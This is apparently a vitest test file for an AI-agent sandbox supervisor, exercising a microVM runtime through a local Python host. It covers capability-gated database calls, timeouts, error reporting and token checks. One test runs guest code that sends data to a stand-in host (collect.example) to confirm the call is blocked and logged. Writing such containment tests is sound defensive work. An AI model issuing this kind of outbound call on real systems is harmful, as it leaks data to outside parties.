/*
 * Agamemnon — AI-agent write-path guardian
 * Copyright (c) 2026 Elamaran Elangovan. All rights reserved.
 *
 * Proprietary and confidential. No licence is granted to use, copy, modify,
 * distribute, or run this software beyond local evaluation of this repository
 * as published. See LICENSE at the repository root.
 *
 * ref: AGMN-BOZW-F6BTKX-X3LAO
 */

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { spawn, type ChildProcess } from "node:child_process";
import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import net from "node:net";
import { MicroVmRuntime } from "../runtimes/microvm.runtime.ts";
import { SandboxSupervisor } from "../supervisor.ts";
import { FakeBridge, sandbox } from "./fakes.ts";

/**
 * The microVM tier, end to end except for the VM itself: supervisor →
 * MicroVmRuntime → TCP → vmhost.py → guest agent. vmhost runs its TEST-ONLY
 * local driver here (no KVM on this machine), so the runtime must be told to
 * accept isolated=false — and refuses by default. The real-VM run is
 * `make vm-check` on the Lima host.
 */

const HERE = dirname(fileURLToPath(import.meta.url));
const VMHOST = join(HERE, "..", "..", "vmhost", "vmhost.py");
const TOKEN = "test-token-" + "0123456789abcdef";
let proc: ChildProcess;
let address = "";
let dir = "";

async function freePort(): Promise<number> {
  return new Promise((resolve) => {
    const s = net.createServer().listen(0, "127.0.0.1", () => {
      const p = (s.address() as net.AddressInfo).port;
      s.close(() => resolve(p));
    });
  });
}

beforeAll(async () => {
  dir = mkdtempSync(join(tmpdir(), "agm-vmh-"));
  writeFileSync(join(dir, "token"), TOKEN);
  const port = await freePort();
  address = `127.0.0.1:${port}`;
  proc = spawn("python3", ["-I", VMHOST, "--listen", address, "--token-file", join(dir, "token"), "--driver", "local-insecure"], { stdio: ["ignore", "ignore", "pipe"] });
  await new Promise<void>((resolve, reject) => {
    const t = setTimeout(() => reject(new Error("vmhost did not start")), 10_000);
    proc.stderr!.on("data", (d: Buffer) => {
      if (d.toString().includes("listening")) {
        clearTimeout(t);
        resolve();
      }
    });
    proc.on("exit", (c) => reject(new Error(`vmhost exited ${c}`)));
  });
});

afterAll(() => {
  proc?.kill("SIGTERM");
  rmSync(dir, { recursive: true, force: true });
});

function setup(opts: { allowInsecure?: boolean; token?: string } = {}) {
  const bridge = new FakeBridge();
  const sup = new SandboxSupervisor({
    bridge,
    runtimeFactory: (kind) => {
      if (kind !== "microvm-adapter") throw new Error("test only builds microVMs");
      return new MicroVmRuntime({ address, token: opts.token ?? TOKEN, allowInsecureLocalDriver: opts.allowInsecure ?? true });
    },
  });
  return { bridge, sup };
}

const vm = (grants: any[] = [], over: any = {}) => sandbox(grants, { runtime: "microvm-adapter", maxMemoryMb: 64, timeoutMs: 4000, ...over });

describe("microVM tier — Python through vmhost (local test driver)", () => {
  it("runs Python, captures print(), returns a JSON value", async () => {
    const { sup } = setup();
    const id = await sup.spawnSandbox(vm());
    const r = await sup.executeInSandbox(id, `import statistics\nxs = context["xs"]\nprint("n =", len(xs))\nreturn {"mean": statistics.mean(xs), "max": max(xs)}`, { xs: [3, 5, 10] });
    expect(r).toMatchObject({ success: true, data: { mean: 6, max: 10 }, logs: ["n = 3"] });
  });

  it("db / api / agents calls cross as syscalls and go through capabilities and the bridge", async () => {
    const { bridge, sup } = setup();
    bridge.rows = [{ amount_cents: 1500 }, { amount_cents: 500 }];
    const id = await sup.spawnSandbox(vm(["READ_ONLY", "MUTATE_STATE"]));
    const r = await sup.executeInSandbox(
      id,
      `rows = db.select("orders", {"status": "refunded"})\ntotal = sum(r["amount_cents"] for r in rows)\nout = db.insert("reports", {"total": total})\nreturn [total, out["status"]]`,
      {},
    );
    expect(r.data).toEqual([2000, "executed"]);
    expect(bridge.reads).toEqual([{ sandboxId: id, table: "orders", where: { status: "refunded" } }]);
    expect(r.proposals.map((p) => p.summary)).toEqual(["insert reports"]);
  });

  it("an ungranted syscall kills the VM and records a violation", async () => {
    const { bridge, sup } = setup();
    const id = await sup.spawnSandbox(vm(["READ_ONLY"]));
    const r = await sup.executeInSandbox(id, `print("before")\napi.fetch("https://collect.example/?d=1")\nprint("after")\nreturn "escaped"`, {});
    expect(r.killed).toMatch(/EXTERNAL_HTTP not granted/);
    expect(r.logs).toEqual(["before"]);
    expect(sup.violations()).toHaveLength(1);
    expect(sup.status(id).status).toBe("terminated");
    expect(bridge.writes).toEqual([]);
  });

  it("the deadline is hard: a CPU-bound loop is destroyed on time", async () => {
    const { sup } = setup();
    const id = await sup.spawnSandbox(vm([], { timeoutMs: 400 }));
    const t0 = Date.now();
    const r = await sup.executeInSandbox(id, `while True:\n    pass`, {});
    expect(r.killed).toMatch(/timeout/);
    expect(Date.now() - t0).toBeLessThan(5000);
    expect(sup.status(id).status).toBe("ready"); // a timeout is not a violation
  });

  it("reports guest exceptions with the line", async () => {
    const { sup } = setup();
    const id = await sup.spawnSandbox(vm());
    const r = await sup.executeInSandbox(id, `x = 1\nraise ValueError("bad input")`, {});
    expect(r.success).toBe(false);
    expect(r.error).toMatch(/ValueError: bad input \(line 2\)/);
  });

  it("refuses a vmhost that is not running VMs unless the caller opted in", async () => {
    const { sup } = setup({ allowInsecure: false });
    const id = await sup.spawnSandbox(vm());
    const r = await sup.executeInSandbox(id, `return 1`, {});
    expect(r.killed).toMatch(/isolated=false/);
  });

  it("rejects a wrong vmhost token", async () => {
    const { sup } = setup({ token: "wrong" });
    const id = await sup.spawnSandbox(vm());
    const r = await sup.executeInSandbox(id, `return 1`, {});
    expect(r.error).toMatch(/unauthorised/);
  });
});
